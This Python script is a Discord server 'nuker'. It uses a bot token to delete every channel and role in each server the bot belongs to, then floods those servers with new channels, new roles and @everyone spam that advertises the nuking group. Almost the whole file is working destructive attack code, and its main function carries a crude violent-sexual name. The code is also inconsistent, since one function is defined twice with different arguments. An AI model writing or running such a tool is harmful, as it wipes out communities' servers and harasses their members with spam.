import requests
import random

Footer = ("@everyone Nuked by http://dsc.gg/reaperxyz "
          "https://media.discordapp.net/attachments/1227299397142970369/1228750697185677454/513ad497-bd26-48d2-9f80-fe5c8c5209cd.gif?ex=662d2e43&is=661ab943&hm=7af13f40be039a942c2f2bd0c080960b61fbf8181f742be0084430f85b7bc4ca&= "
          "https://media.discordapp.net/attachments/1227299397142970369/1228749619584962682/deadbolt-indie-game.gif?ex=662d2d42&is=661ab842&hm=0627e082b2cc31f59487e7829d1c0b3bf476c89cffc67c718e452ebed776a33a&= "
          "https://media.discordapp.net/attachments/1227299397142970369/1228751069140615269/1bbbf01b-74b7-414a-b565-6705e55f191f.gif?ex=662d2e9b&is=661ab99b&hm=68fcd92f0a99be509c2bb95f5ea28198d163cd3399f5ae1cccb786f43a4ccf6a&=")

def send_message(token, channel_id, message, footer):
    headers = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json',
    }
    data = {
        'content': f"{message}\n{footer}"
    }
    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
    if response.status_code == 200:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")

def rape_servers(token, message, amount):
    headers = {
        'Authorization': f'Bot {token}',
    }

    # Reset server for each guild
    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if guilds_response.status_code != 200:
        print(f"Failed to retrieve guilds. Status code: {guilds_response.status_code}")
        return

    for guild in guilds_response.json():
        guild_id = guild['id']
        reset_server(token)

        # Create channels and roles
        channels_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
        if channels_response.status_code != 200:
            print(f"Failed to retrieve channels for guild {guild_id}. Status code: {channels_response.status_code}")
            continue
        
        channels = channels_response.json()
        for channel in channels:
            try:
                for _ in range(int(amount)):
                    create_channel_and_role(token, guild_id)
                    send_message(token, channel['id'], message, Footer)
            except Exception as e:
                print(f"Failed to perform actions on guild {guild_id}, channel {channel['id']}: {e}")

def pick_random_server(token):
    headers = {
        'Authorization': f'Bot {token}',
    }
    response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if response.status_code == 200:
        guilds = response.json()
        admin_guilds = [guild for guild in guilds if guild['permissions'] & 8 == 8]  # Check if the bot has administrator permissions (permission bit 8)
        if admin_guilds:
            return random.choice(admin_guilds)  # Return a random admin guild
        else:
            print("The bot does not have administrator permissions on any server.")
    else:
        print(f"Failed to retrieve guilds. Status code: {response.status_code}")

def pick_random_name():
    with open('utils/names.txt', 'r') as file:
        names = file.readlines()
    return random.choice(names).strip()  # Pick a random name and remove leading/trailing whitespace

def create_channel(token, guild_id, channel_name):
    headers = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json',
    }
    data = {
        'name': channel_name,
        'type': 0  # Text channel
    }
    response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=data)
    if response.status_code == 201:
        print("Channel created successfully.")
    else:
        print(f"Failed to create channel. Status code: {response.status_code}")

def create_role(token, guild_id, role_name):
    headers = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json',
    }
    data = {
        'name': role_name,
        'permissions': 0,  # Default role permissions
        'color': random.randint(0, 16777215),  # Random color
        'hoist': False,  # Do not hoist role
        'mentionable': False  # Do not allow role mentions
    }
    response = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json=data)
    if response.status_code == 201:
        print("Role created successfully.")
    else:
        print(f"Failed to create role. Status code: {response.status_code}")

def create_channel_and_role(token):
    # Pick a random server where the bot is admin
    server = pick_random_server(token)
    if server:
        guild_id = server['id']
        # Pick a random name for the channel and role
        name = pick_random_name()
        # Create channel and role
        create_channel(token, guild_id, name)
        create_role(token, guild_id, name)

def delete_channels(token, guild_id):
    headers = {
        'Authorization': f'Bot {token}',
    }
    channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers).json()
    for channel in channels:
        requests.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=headers)

def delete_roles(token, guild_id):
    headers = {
        'Authorization': f'Bot {token}',
    }
    roles = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers).json()
    for role in roles:
        if role['managed'] == False:  # Skip managed roles (e.g., @everyone)
            requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)

def reset_server(token):
    headers = {
        'Authorization': f'Bot {token}',
    }
    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
    if guilds_response.status_code != 200:
        print(f"Failed to retrieve guilds. Status code: {guilds_response.status_code}")
        return

    for guild in guilds_response.json():
        guild_id = guild['id']
        delete_channels(token, guild_id)
        delete_roles(token, guild_id)

def create_channel_and_role(token, guild_id):
    # Pick a random name for the channel and role
    name = pick_random_name()
    # Create channel and role
    create_channel(token, guild_id, name)
    create_role(token, guild_id, name)
